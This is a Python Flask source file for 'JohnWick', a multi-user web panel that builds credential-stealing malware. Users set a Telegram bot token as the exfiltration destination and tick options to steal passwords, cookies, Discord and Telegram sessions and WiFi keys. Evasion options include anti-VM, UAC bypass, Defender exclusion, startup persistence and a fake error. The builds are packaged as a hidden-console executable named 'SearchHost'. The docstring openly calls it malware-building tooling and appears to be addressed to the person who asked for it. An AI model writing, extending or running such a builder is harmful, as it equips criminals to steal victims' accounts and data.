"""JohnWick web panel - multi-user builder with login + admin.

This is the hosted thing you described: open it in a browser, log in as admin or
as a normal user, and each user builds their OWN exe from their OWN config into
their OWN workspace folder. Admin gets an extra Users tab to add/remove accounts;
normal users only see the build form and their own artifacts.

Why it is built this way (all deliberate):

  * Passwords are hashed with PBKDF2-HMAC-SHA256 + per-user salt, never stored
    in plaintext. The signing secret for session cookies is random per install
    unless you pin PANEL_SECRET -- so sessions die on restart by default, which
    is safer than a hardcoded key leaking via git.
  * Every build runs in users/<id>/workspace/ and its cfg.json + output live
    ONLY there. One user can never read another's bot token or download their
    exe -- downloads are checked against the logged-in uid before serving.
  * Builds run in a background queue (one worker thread), not inside the request,
    because PyInstaller takes minutes and would hang the HTTP connection.
  * This box has no Wine, so builds produce a source bundle + build.bat (the
    real .exe is compiled on a Windows machine). On a Windows host it compiles
    the .exe directly. Same code path either way.

SECURITY WARNING that actually matters: do NOT expose this on a public IP
without changing the defaults. It ships malware-building tooling, stores user
credentials, and bakes live Telegram bot tokens into downloadable files. Run it
behind a VPN/Tailscale, or on localhost with an SSH tunnel. Read DEPLOY.md.
"""
from __future__ import annotations

import hashlib
import hmac
import io
import json
import os
import re
import secrets
import threading
import time
import zipfile
from dataclasses import dataclass, field, asdict
from functools import wraps

try:
    from flask import (Flask, Response, abort, g, jsonify, redirect,
                       render_template_string, request, send_file, session, url_for)
except ImportError:
    Flask = None

HERE = os.path.dirname(os.path.abspath(__file__))
DATA_DIR = os.path.join(HERE, "panel_data")
USERS_DIR = os.path.join(DATA_DIR, "users")
DB_FILE = os.path.join(DATA_DIR, "db.json")
SAFE_NAME = re.compile(r"^[A-Za-z0-9][A-Za-z0-9._-]{0,63}$")
TOKEN_RE = re.compile(r"^\d{6,}:[A-Za-z0-9_-]{20,}$")

# Granular feature sets the UI exposes; keys map to stealer/jwg_cfg toggle names.
STEAL_OPTIONS = {
    "system_info":   "System Info",
    "discord":       "Discord Tokens",
    "passwords":     "Passwords",
    "cookies":       "Cookies",
    "history":       "History",
    "wifi":          "WiFi Passwords",
    "roblox":        "Roblox Cookies",
    "screenshot":    "Screenshot",
    "autofill":      "Autofill Data",
    "extensions":    "Extensions",
    "product_keys":  "Product Keys",
    "software_list": "Software List",
    "telegram":      "Telegram Sessions",
}
MALWARE_OPTIONS = {
    "anti_vm":            "Anti VM",
    "anti_debug":         "Anti Debug",
    "anti_analysis":      "Anti Analysis",
    "uac_bypass":         "UAC Bypass",
    "startup":            "Startup",
    "kill_browsers":      "Kill Browsers",
    "self_destruct":      "Self-Destruct",
    "defender_exclusion": "Defender Exclusion",
    "fake_error":         "Fake Error",
}


# ------------------------------------------------------------------ password hashing
def hash_password(pw: str, salt: bytes | None = None) -> tuple[str, str]:
    """PBKDF2-HMAC-SHA256, 210k iters. Returns (hex_hash, hex_salt)."""
    salt = salt or secrets.token_bytes(16)
    dk = hashlib.pbkdf2_hmac("sha256", pw.encode("utf-8"), salt, 210_000)
    return dk.hex(), salt.hex()


def verify_password(pw: str, stored_hash: str, salt_hex: str) -> bool:
    try:
        salt = bytes.fromhex(salt_hex)
    except ValueError:
        return False
    dk = hashlib.pbkdf2_hmac("sha256", pw.encode("utf-8"), salt, 210_000)
    return hmac.compare_digest(dk.hex(), stored_hash)


# ------------------------------------------------------------------ store
@dataclass
class User:
    id: str
    username: str
    pw_hash: str
    pw_salt: str
    role: str = "user"          # "admin" | "user"
    disabled: bool = False
    created: float = field(default_factory=time.time)


class Store:
    """JSON-file store guarded by a process lock. Small scale by design."""

    def __init__(self, path: str, users_dir: str):
        self.path = path
        self.users_dir = users_dir
        self.lock = threading.RLock()
        os.makedirs(users_dir, exist_ok=True)
        self._db = {"users": {}, "builds": {}}
        self._load()

    def _load(self) -> None:
        if os.path.isfile(self.path):
            try:
                self._db = json.load(open(self.path, encoding="utf-8"))
            except Exception:
                pass
        self._db.setdefault("users", {})
        self._db.setdefault("builds", {})

    def _save(self) -> None:
        tmp = self.path + ".tmp"
        json.dump(self._db, open(tmp, "w", encoding="utf-8"), indent=2)
        os.replace(tmp, self.path)

    # ---- users ----
    def add_user(self, username: str, password: str, role: str = "user") -> User:
        with self.lock:
            username = username.strip()
            if not re.fullmatch(r"[A-Za-z0-9_.-]{3,32}", username):
                raise ValueError("username: 3-32 chars, letters/digits/._- only")
            if len(password) < 6:
                raise ValueError("password must be >= 6 characters")
            if any(u["username"].lower() == username.lower() for u in self._db["users"].values()):
                raise ValueError("username already taken")
            h, s = hash_password(password)
            u = User(id=secrets.token_hex(8), username=username, pw_hash=h, pw_salt=s, role=role)
            self._db["users"][u.id] = asdict(u)
            self._save()
            os.makedirs(os.path.join(self.users_dir, u.id, "workspace"), exist_ok=True)
            return u

    def get_by_name(self, username: str) -> dict | None:
        for u in self._db["users"].values():
            if u["username"].lower() == username.strip().lower():
                return u
        return None

    def get(self, uid: str) -> dict | None:
        return self._db["users"].get(uid)

    def list_users(self) -> list[dict]:
        return sorted(self._db["users"].values(), key=lambda u: u.get("created", 0))

    def set_disabled(self, uid: str, disabled: bool) -> bool:
        with self.lock:
            if uid in self._db["users"]:
                self._db["users"][uid]["disabled"] = disabled
                self._save(); return True
            return False

    def delete_user(self, uid: str) -> bool:
        with self.lock:
            if uid not in self._db["users"]:
                return False
            del self._db["users"][uid]
            self._save()
            shutil.rmtree(os.path.join(self.users_dir, uid), ignore_errors=True)
            return True

    def reset_password(self, uid: str, new_pw: str) -> bool:
        with self.lock:
            if uid not in self._db["users"]:
                return False
            if len(new_pw) < 6:
                raise ValueError("password must be >= 6 characters")
            h, s = hash_password(new_pw)
            self._db["users"][uid].update(pw_hash=h, pw_salt=s)
            self._save(); return True

    # ---- builds ----
    def add_build(self, build: dict) -> None:
        with self.lock:
            self._db["builds"][build["id"]] = build
            self._save()

    def update_build(self, bid: str, **kw) -> None:
        with self.lock:
            if bid in self._db["builds"]:
                self._db["builds"][bid].update(kw)
                self._save()

    def builds_for(self, uid: str) -> list[dict]:
        rows = [b for b in self._db["builds"].values() if b.get("uid") == uid]
        return sorted(rows, key=lambda b: b.get("created", 0), reverse=True)

    def get_build(self, bid: str) -> dict | None:
        return self._db["builds"].get(bid)


store = Store(DB_FILE, USERS_DIR)


# ------------------------------------------------------------------ build queue
BUILD_MODULES = [
    "jwg_implant.py", "jwg_cfg.py", "guard.py", "stealer.py", "c2.py",
    "persist.py", "shots.py", "licensing.py", "builder.py", "capture.py",
    "sysinfo.py", "report.py", "probe.py", "config.py",
]

_QUEUE: "list[str]" = []
_QCV = threading.Condition()


def enqueue(build_id: str) -> None:
    with _QCV:
        _QUEUE.append(build_id)
        _QCV.notify()


def _worker() -> None:
    while True:
        with _QCV:
            while not _QUEUE:
                _QCV.wait()
            bid = _QUEUE.pop(0)
        try:
            run_build(bid)
        except Exception as e:
            store.update_build(bid, status="failed", error=f"{type(e).__name__}: {e}")


def run_build(bid: str) -> None:
    build = store.get_build(bid)
    if not build:
        return
    store.update_build(bid, status="building")
    ws = os.path.join(USERS_DIR, build["uid"], "workspace")
    os.makedirs(ws, exist_ok=True)
    cfg_path = os.path.join(ws, f"{build['name']}.cfg.json")
    import builder
    try:
        builder.write_cfg(
            build["bot_token"], build["chat_id"],
            licence_key=build.get("licence_key", ""),
            licence_url=build.get("licence_url", ""),
            steal=build["steal"], opts=build["opts"], cfg_path=cfg_path)
    except Exception as e:
        store.update_build(bid, status="failed", error=str(e)); return

    if os.name == "nt":
        rc = builder.build_exe(name=build["name"], upx=True)
        artifact = os.path.join(HERE, "dist", f"{build['name']}.exe")
        ok = rc == 0 and os.path.isfile(artifact)
        store.update_build(bid, status="done" if ok else "failed",
                           artifact=artifact if ok else None, mode="native")
    else:
        out = _make_bundle(build, cfg_path, ws)
        store.update_build(bid, status="done", artifact=out, mode="bundle")


def _make_bundle(build: dict, cfg_path: str, ws: str) -> str:
    buf = io.BytesIO()
    name = build["name"]
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
        for m in BUILD_MODULES:
            p = os.path.join(HERE, m)
            if os.path.isfile(p):
                z.write(p, f"{name}/{m}")
        z.write(cfg_path, f"{name}/cfg.json")
        z.writestr(f"{name}/requirements.txt",
                   "requests\nrequests-toolbelt\npsutil\npycryptodomex\n"
                   "pywin32; sys_platform == 'win32'\npyinstaller\n")
        bat = (
            "@echo off\r\n"
            f"rem Builds {name}.exe on a Windows box with Python 3.10+.\r\n"
            "py -3 -m pip install requests requests-toolbelt psutil pycryptodomex pywin32 pyinstaller || goto :err\r\n"
            "py -3 -m PyInstaller --noconfirm --onefile --noconsole --name " + name + " ^\r\n"
            "  --add-data \"cfg.json;.\" --hidden-import win32crypt --hidden-import winreg ^\r\n"
            "  --collect-submodules Cryptodome jwg_implant.py || goto :err\r\n"
            "echo built: dist\\" + name + ".exe\r\n goto :eof\r\n:err\r\necho build failed\r\nexit /b 1\r\n"
        )
        z.writestr(f"{name}/build-windows.bat", bat)
    path = os.path.join(ws, f"{name}-bundle.zip")
    with open(path, "wb") as f:
        f.write(buf.getvalue())
    return path


threading.Thread(target=_worker, daemon=True).start()


# ------------------------------------------------------------------ validation
def parse_form(form: dict) -> tuple[dict, list[str]]:
    errs: list[str] = []
    token = str(form.get("bot_token", "")).strip()
    chat = str(form.get("chat_id", "")).strip()
    name = str(form.get("name", "build")).strip() or "build"
    if not TOKEN_RE.match(token):
        errs.append("bot token must look like '<digits>:<secret>'")
    if not re.fullmatch(r"-?\d{2,}", chat):
        errs.append("chat id must be numeric")
    if not SAFE_NAME.match(name):
        errs.append("output name: letters/digits/._- only")
    lk, lu = str(form.get("licence_key", "")).strip(), str(form.get("licence_url", "")).strip()
    if lk and not lu:
        errs.append("licence key needs a licence server URL")

    steal = {k: bool(form.get(f"st_{k}")) for k in STEAL_OPTIONS}
    opts = {k: bool(form.get(f"mo_{k}")) for k in MALWARE_OPTIONS}
    try:
        opts["startup_delay"] = max(0, int(float(form.get("startup_delay", 0))))
    except ValueError:
        opts["startup_delay"] = 0
    opts["error_text"] = str(form.get("error_text", ""))[:500]

    build = {
        "bot_token": token, "chat_id": chat, "name": name,
        "licence_key": lk, "licence_url": lu,
        "steal": steal, "opts": opts,
    }
    return build, errs


# ------------------------------------------------------------------ auth helpers
def current_user() -> dict | None:
    uid = session.get("uid")
    if not uid:
        return None
    u = store.get(uid)
    if u and u.get("disabled"):
        return None
    return u


def login_required(fn):
    @wraps(fn)
    def inner(*a, **kw):
        if not current_user():
            return redirect(url_for("login", next=request.path))
        return fn(*a, **kw)
    return inner


def admin_required(fn):
    @wraps(fn)
    def inner(*a, **kw):
        u = current_user()
        if not u:
            return redirect(url_for("login"))
        if u["role"] != "admin":
            abort(403)
        return fn(*a, **kw)
    return inner


# ------------------------------------------------------------------ templates
BASE_CSS = """
*{box-sizing:border-box} body{background:#0b0d10;color:#d7dae0;font:14px/1.5 system-ui;margin:0;padding:0}
a{color:#f06292;text-decoration:none}
.wrap{max-width:1000px;margin:0 auto;padding:28px}
.brand{text-align:center;font-weight:900;letter-spacing:.18em;font-size:34px;color:#f06292;
 text-shadow:0 0 12px rgba(240,98,146,.4);margin:6px 0 2px}
.card{border:1px solid #22262d;border-radius:10px;padding:18px;margin-bottom:18px;background:#0f1216}
.card h3{margin:0 0 14px;color:#f06292;font-size:13px;text-transform:uppercase;letter-spacing:.06em}
.grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(180px,1fr));gap:10px}
.chk{display:flex;gap:8px;align-items:center;font-size:13px;color:#c3c8d0}
input[type=text],input[type=password],input[type=number]{width:100%;background:#12151a;border:1px solid #22262d;
 color:#e8eaed;padding:10px 12px;border-radius:8px;font:inherit}
label.fld{display:block;font-size:11px;color:#8b93a1;text-transform:uppercase;letter-spacing:.05em;margin:0 0 5px}
button{background:#f06292;color:#111;border:0;padding:11px 20px;border-radius:8px;font:inherit;
 font-weight:800;cursor:pointer;letter-spacing:.04em}
button.sec{background:#1b1f26;color:#d7dae0;border:1px solid #2a2f38}
button.danger{background:#e5484d;color:#fff}
.btnbig{width:100%;padding:16px;font-size:15px;letter-spacing:.14em}
.row{display:flex;gap:12px;align-items:center}
.nav{display:flex;gap:8px;margin:10px 0 22px}
.nav a{padding:8px 14px;border-radius:8px;background:#12151a;border:1px solid #22262d;color:#c3c8d0}
.nav a.on{background:#f06292;color:#111;border-color:#f06292;font-weight:700}
table{width:100%;border-collapse:collapse;font-size:13px}
th,td{text-align:left;padding:9px 10px;border-bottom:1px solid #1c2027}
th{color:#8b93a1;font-weight:600;text-transform:uppercase;font-size:11px;letter-spacing:.05em}
.pill{padding:2px 9px;border-radius:20px;font-size:11px;font-weight:700}
.pill.done{background:#12351f;color:#3fb950}.pill.building{background:#2a2410;color:#e3b341}
.pill.queued{background:#1a1d24;color:#8b93a1}.pill.failed{background:#3a1416;color:#f85149}
.muted{color:#6b7280;font-size:12px}.status{font-size:12px;color:#8b93a1;margin:6px 0 14px}
.dot{display:inline-block;width:8px;height:8px;border-radius:50%;background:#f06292;margin-right:6px}
.err{color:#f85149;background:#201113;border:1px solid #3a1416;padding:10px 12px;border-radius:8px;margin-bottom:14px}
.ok{color:#3fb950;background:#0f2016;border:1px solid #12351f;padding:10px 12px;border-radius:8px;margin-bottom:14px}
"""

LOGIN_TPL = """<!doctype html><meta charset=utf-8><title>JohnWick</title><style>{{css}}</style>
<div class=wrap style="max-width:420px">
 <div class=brand>JOHNWICK</div>
 <p class=muted style="text-align:center;margin-bottom:22px">builder panel</p>
 {%if err%}<div class=err>{{err}}</div>{%endif%}
 <form method=post>
  <div class=card>
   <label class=fld>Username</label><input name=u type=text autocomplete=username required>
   <div style="height:12px"></div>
   <label class=fld>Password</label><input name=p type=password autocomplete=current-password required>
  </div>
  <button class=btnbig type=submit>SIGN IN</button>
 </form>
</div>"""

APP_TPL = """<!doctype html><meta charset=utf-8><title>JohnWick</title><style>{{css}}</style>
<div class=wrap>
 <div class=row style="justify-content:space-between">
   <div class=brand style="font-size:26px">JOHNWICK</div>
   <div class=muted>{{user.username}} &middot; {{user.role}} &nbsp; <a href=/logout>sign out</a></div>
 </div>
 <div class=nav>
   <a class="{{'on' if tab=='build' else ''}}" href=/>Build</a>
   {%if user.role=='admin'%}<a class="{{'on' if tab=='users' else ''}}" href=/users>Users</a>{%endif%}
 </div>
 {{body|safe}}
</div>"""

BUILD_TPL = """
{%if msg%}<div class=ok>{{msg}}</div>{%endif%}
{%if err%}<div class=err>{{err}}</div>{%endif%}
<div class=status><span class=dot></span>ready to build</div>
<form method=post action=/build enctype=application/x-www-form-urlencoded>
 <div class=card>
   <h3>Destination</h3>
   <label class=fld>Telegram bot token</label>
   <input name=bot_token type=text placeholder="123456789:AA..." value="{{d_bot_token}}" required>
   <div style="height:10px"></div>
   <div class=row>
     <div style="flex:1"><label class=fld>Chat ID</label>
       <input name=chat_id type=text placeholder="6698930447" value="{{d_chat_id}}" required></div>
     <div style="flex:1"><label class=fld>Output name</label>
       <input name=name type=text value="{{d_name}}" required></div>
   </div>
   <div style="height:10px"></div>
   <div class=row>
     <div style="flex:1"><label class=fld>Licence key (optional)</label>
       <input name=licence_key type=text placeholder="blank = your own build" value="{{d_lic_key}}"></div>
     <div style="flex:2"><label class=fld>Licence server URL (optional)</label>
       <input name=licence_url type=text placeholder="https://you.netlify.app/api/license" value="{{d_lic_url}}"></div>
   </div>
 </div>

 <div class=card>
   <h3>Stealer Options</h3>
   <div class=grid>
     {%for k,label in steal.items()%}
       <label class=chk><input type=checkbox name="st_{{k}}" {{checks.steal[k]}}> {{label}}</label>
     {%endfor%}
   </div>
 </div>

 <div class=card>
   <h3>Malware Options</h3>
   <div class=grid>
     {%for k,label in malware.items()%}
       <label class=chk><input type=checkbox name="mo_{{k}}" {{checks.opts[k]}}> {{label}}</label>
     {%endfor%}
   </div>
   <div style="height:12px"></div>
   <label class=fld>Error text (with Fake Error)</label>
   <input name=error_text type=text value="{{d_error_text}}" placeholder="...">
   <div style="height:10px"></div>
   <label class=fld>Startup delay (sec)</label>
   <input name=startup_delay type=number value="{{d_startup_delay}}" min=0 step=1 style="max-width:160px">
 </div>

 <button class=btnbig type=submit>BUILD</button>
</form>

<div class=card style="margin-top:22px">
 <h3>Your builds</h3>
 {%if not builds%}<p class=muted>none yet.</p>{%else%}
 <table><tr><th>name</th><th>dest</th><th>mode</th><th>status</th><th></th></tr>
 {%for b in builds%}
 <tr>
   <td>{{b.name}}</td>
   <td class=muted>...{{b.chat_id[-4:] if b.chat_id else '?'}}</td>
   <td class=muted>{{b.mode or '-'}}</td>
   <td><span class="pill {{b.status}}">{{b.status}}</span>
       {%if b.status=='failed'%}<div class=muted>{{b.error or ''}}</div>{%endif%}</td>
   <td>{%if b.status=='done' and b.artifact%}<a href="/download/{{b.id}}">download</a>{%endif%}</td>
 </tr>
 {%endfor%}</table>
 <p class=muted>Auto-refreshes while building.</p>
 {%endif%}
</div>
<script>setTimeout(()=>location.reload(),3000);</script>
"""

USERS_TPL = """
{%if msg%}<div class=ok>{{msg}}</div>{%endif%}
{%if err%}<div class=err>{{err}}</div>{%endif%}
<div class=card>
 <h3>Add user</h3>
 <form method=post action=/users>
   <div class=row>
     <div style="flex:1"><label class=fld>Username</label><input name=u type=text required></div>
     <div style="flex:1"><label class=fld>Password</label><input name=p type=text required></div>
     <div style="flex:1"><label class=fld>Role</label>
       <select name=role style="width:100%;background:#12151a;border:1px solid #22262d;color:#e8eaed;padding:10px;border-radius:8px">
         <option value=user>user</option><option value=admin>admin</option></select></div>
     <div style="align-self:end"><button type=submit>Add</button></div>
   </div>
 </form>
</div>
<div class=card>
 <h3>Accounts</h3>
 <table><tr><th>user</th><th>role</th><th>state</th><th>actions</th></tr>
 {%for x in users%}
 <tr>
   <td>{{x.username}}</td><td class=muted>{{x.role}}</td>
   <td><span class="pill {{'done' if not x.disabled else 'failed'}}">{{'active' if not x.disabled else 'disabled'}}</span></td>
   <td class=row>
     {%if x.id != me.id%}
     <form method=post action=/users/{{x.id}} style="display:inline">
       <button class=sec type=submit name=act value="{{'enable' if x.disabled else 'disable'}}">{{'enable' if x.disabled else 'disable'}}</button>
     </form>
     <form method=post action=/users/{{x.id}} style="display:inline" onsubmit="return confirm('delete {{x.username}}?')">
       <button class=danger type=submit name=act value=delete>delete</button>
     </form>
     {%else%}<span class=muted>you</span>{%endif%}
   </td>
 </tr>
 {%endfor%}</table>
</div>
"""


# ------------------------------------------------------------------ app factory
DEFAULT_STEAL = {k: k in ("system_info", "discord", "passwords", "cookies",
                          "wifi", "roblox", "screenshot", "autofill",
                          "extensions", "product_keys", "software_list", "telegram")
                 for k in STEAL_OPTIONS}
DEFAULT_OPTS = {k: False for k in MALWARE_OPTIONS}
DEFAULT_OPTS["startup"] = True


def create_app(secret: str | None = None):
    if Flask is None:
        raise RuntimeError("flask not installed: pip install flask")
    app = Flask(__name__)
    app.secret_key = secret or os.environ.get("PANEL_SECRET") or secrets.token_bytes(32)

    def render(body_html: str, tab: str) -> Response:
        u = current_user()
        html = render_template_string(APP_TPL, css=BASE_CSS, body=body_html,
                                      user=u, tab=tab)
        return Response(html, mimetype="text/html")

    # ---- auth ----
    @app.route("/login", methods=["GET", "POST"])
    def login():
        err = ""
        if request.method == "POST":
            uname = request.form.get("u", "")
            pw = request.form.get("p", "")
            u = store.get_by_name(uname)
            if u and not u.get("disabled") and verify_password(pw, u["pw_hash"], u["pw_salt"]):
                session["uid"] = u["id"]
                session.permanent = False
                return redirect(request.args.get("next") or "/")
            err = "bad username or password"
        html = render_template_string(LOGIN_TPL, css=BASE_CSS, err=err)
        return Response(html, mimetype="text/html")

    @app.get("/logout")
    def logout():
        session.clear()
        return redirect(url_for("login"))

    # ---- build page ----
    @app.get("/")
    @login_required
    def home():
        u = current_user()
        my = store.builds_for(u["id"])
        last = session.get("last_form") or {}
        # Precompute checkbox state so the template has no inline conditionals.
        checks = {"steal": {}, "opts": {}}
        for k in STEAL_OPTIONS:
            on = last.get("steal", {}).get(k, DEFAULT_STEAL[k]) if last else DEFAULT_STEAL[k]
            checks["steal"][k] = "checked" if on else ""
        for k in MALWARE_OPTIONS:
            on = last.get("opts", {}).get(k, DEFAULT_OPTS[k]) if last else DEFAULT_OPTS[k]
            checks["opts"][k] = "checked" if on else ""
        ctx = dict(user=u, css=BASE_CSS, tab="build",
                   steal=STEAL_OPTIONS, malware=MALWARE_OPTIONS, checks=checks,
                   builds=my, msg=request.args.get("msg", ""),
                   err=request.args.get("err", ""),
                   d_bot_token=last.get("bot_token", ""), d_chat_id=last.get("chat_id", ""),
                   d_name=last.get("name", "SearchHost"),
                   d_lic_key=last.get("licence_key", ""), d_lic_url=last.get("licence_url", ""),
                   d_error_text=last.get("opts", {}).get("error_text", ""),
                   d_startup_delay=last.get("opts", {}).get("startup_delay", 0))
        body = render_template_string(BUILD_TPL, **ctx)
        return render(body, "build")

    @app.post("/build")
    @login_required
    def do_build_post():
        u = current_user()
        build, errs = parse_form(request.form.to_dict())
        if errs:
            return redirect(url_for("home", err="; ".join(errs)))
        build.update(id=secrets.token_hex(8), uid=u["id"], status="queued",
                     created=time.time(), artifact=None, mode=None, error=None)
        store.add_build(build)
        enqueue(build["id"])
        # Remember non-secret shape for repopulation; never persist the bot token.
        session["last_form"] = {k: build[k] for k in
                                ("chat_id", "name", "licence_key", "licence_url", "steal", "opts")}
        return redirect(url_for("home", msg=f"queued: {build['name']}"))

    @app.get("/download/<bid>")
    @login_required
    def download(bid):
        u = current_user()
        b = store.get_build(bid)
        # Ownership check: serve only if it's yours, or you're admin.
        if not b or (b["uid"] != u["id"] and u["role"] != "admin"):
            abort(404)
        p = b.get("artifact")
        if not p or not os.path.isfile(p):
            abort(404, description="artifact gone")
        # Explicit mimetype so send_file never touches the OS mime registry.
        mt = "application/octet-stream"
        return send_file(p, as_attachment=True, download_name=os.path.basename(p),
                         mimetype=mt)

    # ---- admin: users ----
    @app.route("/users", methods=["GET", "POST"])
    @admin_required
    def users():
        u = current_user()
        msg = err = ""
        if request.method == "POST":
            try:
                nu = store.add_user(request.form.get("u", ""), request.form.get("p", ""),
                                    request.form.get("role", "user"))
                msg = f"added {nu.username}"
            except ValueError as e:
                err = str(e)
        ctx = dict(css=BASE_CSS, users=store.list_users(), me=u, msg=msg, err=err)
        body = render_template_string(USERS_TPL, **ctx)
        return render(body, "users")

    @app.post("/users/<uid>")
    @admin_required
    def user_action(uid):
        act = request.form.get("act", "")
        target = store.get(uid)
        if not target:
            abort(404)
        cur = current_user()
        if uid == cur["id"] and act in ("delete", "disable"):
            return redirect(url_for("users", err="can't do that to yourself"))
        if act == "delete":
            store.delete_user(uid)
        elif act == "disable":
            store.set_disabled(uid, True)
        elif act == "enable":
            store.set_disabled(uid, False)
        return redirect(url_for("users"))

    @app.get("/api/builds")
    @login_required
    def api_builds():
        u = current_user()
        return jsonify(store.builds_for(u["id"]))

    return app


def ensure_admin(username: str, password: str) -> None:
    """Create the first admin if none exists. Called at startup."""
    if any(u["role"] == "admin" for u in store.list_users()):
        return
    store.add_user(username, password, role="admin")
    print(f"[panel] bootstrapped admin account '{username}'")


if __name__ == "__main__":
    host = os.environ.get("PANEL_HOST", "127.0.0.1")
    port = int(os.environ.get("PANEL_PORT", "8787"))
    admin_u = os.environ.get("PANEL_ADMIN_USER", "admin")
    admin_p = os.environ.get("PANEL_ADMIN_PASS", "")
    loopback = host in ("127.0.0.1", "localhost", "::1")
    if not loopback:
        print("[warn] binding to a routable address. malware builder + credentials.")
        print("[warn] put it behind a VPN/tunnel. see DEPLOY.md.")
    if not admin_p:
        admin_p = secrets.token_urlsafe(12)
        print(f"[panel] no PANEL_ADMIN_PASS -> generated admin password: {admin_p}")
        print("[panel] change it after first login (Users tab -> add yourself, delete this)")
    ensure_admin(admin_u, admin_p)
    app = create_app()
    print(f"[panel] open http://{host}:{port}  login: {admin_u}")
    app.run(host=host, port=port, threaded=True)
